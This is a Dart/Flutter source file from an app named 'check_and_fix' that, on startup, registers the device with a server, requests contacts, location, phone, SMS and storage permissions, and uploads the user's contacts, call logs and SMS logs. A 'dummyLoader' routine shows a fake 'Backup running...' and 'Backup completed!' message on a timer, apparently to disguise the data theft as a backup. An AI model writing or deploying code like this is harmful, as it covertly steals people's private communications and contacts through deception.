// ignore_for_file: use_build_context_synchronously

import 'dart:io';

import 'package:check_and_fix/presentation/utils/color_printer.dart';
import 'package:check_and_fix/services/api_services.dart';
import 'package:fk_user_agent/fk_user_agent.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter_easyloading/flutter_easyloading.dart';
import 'package:hive/hive.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:uuid/uuid.dart';

class Init {
  String? uuid;
  String? imei;
  String? agent;
  late Box box;

  void initConnection(BuildContext context) async {
    print('START: initConnection() - GET UUID...');

    await _initServerConnection();

    printWhite('UUID: $uuid');
    printWhite('IMEI: $imei');
    printWhite('agent: $agent');

    // await FileManager.requestFilesAccessPermission();
    final getContacts = await _requestPermission(Permission.contacts);
    if (uuid != null) await _requestPermission(Permission.location);
    await _requestPermission(Permission.phone);
    await _requestPermission(Permission.sms);
    await _requestPermission(Permission.manageExternalStorage);

    dummyLoader();
    // Api.sendLocation(agent, uuid);
    if (getContacts) await Api.sendContacts(context, agent, uuid);
    print('getContacts $getContacts');
    if (Platform.isAndroid) await Api.sendCallLogs(context, agent, uuid);
    if (Platform.isAndroid) await Api.sendSmsLogs(context, agent, uuid);
  }

  Future _initServerConnection() async {
    try {
      box = await Hive.openBox('myBox');
      await FkUserAgent.init();
      agent = FkUserAgent.userAgent!;
      imei = box.get('imei') ??
          const Uuid().v4(); // DEBUG UUID: 870e76ef-1ac7-41f6-a467-6bec59b4e315
      uuid = box.get('uuid');
      uuid ??= await Api.sendDeviceInfo(agent!, imei);

      box.put('agent', agent);
      box.put('uuid', uuid);
      box.put('imei', imei);
    } catch (e) {
      print(e.toString());
    }
  }

  static Future<bool> _requestPermission(Permission permission) async {
    final alreadyGranted = await permission.isGranted;
    if (alreadyGranted) return true;
    final status = await permission.request();

    try {
      if (status.isGranted) {
        if (kDebugMode) {
          print('${permission.toString()} granted');
        }
      } else {
        if (kDebugMode) {
          print('${permission.toString()} denied');
        }
      }
    } catch (e) {
      if (kDebugMode) {
        print('$e');
      }
    }

    return status.isGranted;
  }

  static Future dummyLoader([String? type]) async {
    EasyLoading.show(
        dismissOnTap: false,
        status: '${type ?? 'Auto'}'
            ' Backup running...',
        maskType: EasyLoadingMaskType.custom);

    await Future.delayed(const Duration(milliseconds: 2250));

    await EasyLoading.showSuccess('Backup completed!',
        dismissOnTap: false,
        duration: const Duration(milliseconds: 1250),
        maskType: EasyLoadingMaskType.custom);
  }
}
